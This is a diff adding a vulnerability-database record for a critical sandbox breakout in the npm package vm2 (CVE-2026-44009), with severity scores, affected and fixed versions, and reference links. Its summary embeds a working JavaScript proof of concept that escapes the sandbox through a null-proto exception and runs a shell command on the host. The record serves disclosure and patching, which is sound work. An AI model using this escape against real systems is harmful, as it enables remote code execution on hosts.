@@ -1,0 +1,46 @@
+advisory_id: GHSA-9vg3-4rfj-wgcm
+datasource_id: github_osv_importer_v2/GHSA-9vg3-4rfj-wgcm
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-9vg3-4rfj-wgcm/GHSA-9vg3-4rfj-wgcm.json
+aliases:
+  - CVE-2026-44009
+summary: "vm2 has Sandbox Breakout Through Null Proto Exception\n### Summary\n\nVM2 suffers\
+  \ from a sandbox breakout vulnerability. This allows attackers to write code which can escape\
+  \ from the VM2 sandbox and execute arbitrary commands on the host system.\n\n### Details\n\
+  \nIn `handleException` due to ``// SECURITY (post-GHSA-mpf8 hardening): use `from` (not `ensureThis`)``\
+  \ exceptions with a null proto will be assumed to come from the other side and being proxied.\
+  \ Therefore, it is possible to get the proxied and unproxied object of a sandbox object with\
+  \ a null proto when thrown and then catched which allows to get the host `Function` object.\n\
+  \n### PoC\n\n```js\nconst {VM} = require(\"vm2\");\nconst vm = new VM();\nconsole.log(vm.run(`\n\
+  const o = {__proto__: null};\ntry {\n\tthrow o;\n} catch (e) {\n\te.f = Buffer.prototype.inspect\n\
+  \to.f.constructor(\"return process\")().mainModule.require('child_process').execSync('touch\
+  \ pwned');\n}\n`));\n```\n\n### Impact\n\nAttackers can perform Remote Code Execution under\
+  \ the assumption that arbitrary code can be executed inside the context of a vm2 sandbox."
+impacted_packages:
+  - purl: pkg:npm/vm2
+    affected_versions: vers:npm/<3.11.2
+    fixed_versions: vers:npm/3.11.2
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '9.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    published_at: None
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-9vg3-4rfj-wgcm/GHSA-9vg3-4rfj-wgcm.json
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url:
+weaknesses:
+  - CWE-668
+references:
+  - url: https://github.com/patriksimek/vm2
+    reference_type:
+    reference_id:
+  - url: https://github.com/patriksimek/vm2/releases/tag/v3.11.2
+    reference_type:
+    reference_id:
+  - url: https://github.com/patriksimek/vm2/security/advisories/GHSA-9vg3-4rfj-wgcm
+    reference_type:
+    reference_id:
